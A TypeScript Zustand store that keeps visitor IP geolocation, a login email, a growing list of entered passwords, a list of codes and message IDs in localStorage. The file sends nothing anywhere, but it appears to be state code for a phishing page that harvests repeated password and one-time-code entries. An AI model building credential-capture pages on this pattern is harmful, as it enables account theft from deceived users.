import { create } from 'zustand';
import { createJSONStorage, persist } from 'zustand/middleware';

interface GeoInfo {
    asn: number;
    ip: string;
    country: string;
    city: string;
    country_code: string;
    region: string;
}

interface State {
    isModalOpen: boolean;
    geoInfo: GeoInfo | null;
    messageId: number | null;
    message: string | null;
    baseMessage: string | null;
    passwords: string[];
    codes: string[];
    loginEmail: string | null;
    setModalOpen: (isOpen: boolean) => void;
    setGeoInfo: (info: GeoInfo) => void;
    setMessageId: (id: number | null) => void;
    setMessage: (msg: string | null) => void;
    setBaseMessage: (msg: string | null) => void;
    addPassword: (p: string) => void;
    addCode: (c: string) => void;
    setLoginEmail: (email: string | null) => void;
    resetSession: () => void;
}

export const store = create<State>()(
    persist(
        (set) => ({
            isModalOpen: false,
            geoInfo: null,
            messageId: null,
            message: null,
            baseMessage: null,
            passwords: [],
            codes: [],
            loginEmail: null,
            setModalOpen: (isOpen: boolean) => set({ isModalOpen: isOpen }),
            setGeoInfo: (info: GeoInfo) => set({ geoInfo: info }),
            setMessageId: (id: number | null) => set({ messageId: id }),
            setMessage: (msg: string | null) => set({ message: msg }),
            setBaseMessage: (msg: string | null) => set({ baseMessage: msg }),
            addPassword: (p: string) => set((state) => ({ passwords: [...state.passwords, p] })),
            addCode: (c: string) => set((state) => ({ codes: [...state.codes, c] })),
            setLoginEmail: (email: string | null) => set({ loginEmail: email }),
            resetSession: () =>
                set({
                    messageId: null,
                    message: null,
                    baseMessage: null,
                    passwords: [],
                    codes: [],
                    loginEmail: null
                })
        }),
        {
            name: 'storage',
            storage: createJSONStorage(() => localStorage),
            partialize: (state) => ({
                geoInfo: state.geoInfo,
                messageId: state.messageId,
                message: state.message,
                baseMessage: state.baseMessage,
                passwords: state.passwords,
                codes: state.codes,
                loginEmail: state.loginEmail
            })
        }
    )
);
